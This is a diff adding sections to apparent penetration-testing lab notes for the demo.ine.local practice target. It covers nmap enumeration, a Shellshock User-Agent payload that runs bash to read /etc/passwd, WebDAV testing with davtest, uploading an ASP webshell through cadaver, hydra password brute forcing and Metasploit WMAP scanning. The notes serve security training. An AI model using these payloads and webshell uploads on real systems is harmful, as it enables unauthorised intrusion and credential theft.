@@ -1,5 +1,37 @@
 
 
+```
+nmap --script http-enum -sV -p 80 $TG
+```
+
+
+## ShellShock
+
+```
+nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
+```
+
+Injecting through `User-Agent` Header:
+```
+User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+```
+
+
+## WevDAV
+
+```
+davtest -url http://demo.ine.local/webdav
+davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
+```
+
+
+The .asp backdoor present in `/usr/share/webshells/asp/` directory. i.e `/usr/share/webshells/asp/webshell.asp`.
+
+```
+cadaver http://demo.ine.local/webdav
+put /usr/share/webshells/asp/webshell.asp
+ls
+```
 
 Using dirb to do local directory enumeration on Web root.
 ```
@@ -67,3 +99,40 @@ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desk
 ```
 hydra -l <USERNAME> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $TG http-get /
 ```
+
+
+
+
+
+## Web App Vulnerability Scanning with WMAP
+
+WMAP is a metasploit module that helps to identify misconfigurations and vulnerabilities on the web server that can be exploited. Run `msfconsole` to get started.
+
+To load `WMAP` and add targets:
+```
+load wmap
+wmap_sites -a 192.157.89.3
+wmap_targets -t http://192.157.89.3
+```
+
+To list out sites and targets:
+```
+wmap_sites -l
+wmap_targets -l
+```
+
+The below command will begin testing the target and then displays a list of available modules that can be run against the target web server:
+```
+wmap_run -t
+```
+
+Perform a web app vulnerability scan on the target by running the following command:
+```
+wmap_run -e
+```
+
+
+
+
+
+
